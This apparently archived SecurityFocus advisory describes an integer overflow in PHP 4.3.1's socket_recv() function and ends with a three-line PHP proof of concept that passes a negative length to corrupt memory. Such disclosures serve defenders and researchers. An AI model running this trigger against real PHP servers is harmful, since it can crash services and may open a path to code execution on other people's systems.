source: http://www.securityfocus.com/bid/7197/info

A vulnerability has been reported in PHP versions 4.3.1 and earlier. The problem occurs in the socket_recv() and may allow an attacker to corrupt memory. Specifically, the affected function fails to carry out sanity checks on user-supplied argument values, making it prone to an integer overflow.

This may make it possible for an attacker to trigger a denial of service. Although it has not been confirmed, it may also be possible to exploit this issue to execute arbitrary code.

It should be noted that socket functionality is only included in PHP if compiled with the "--enable-sockets" option.

<?php
$buf = "";
socket_recv(socket_create(AF_INET, SOCK_STREAM, 0), $buf, -3, 0);
?>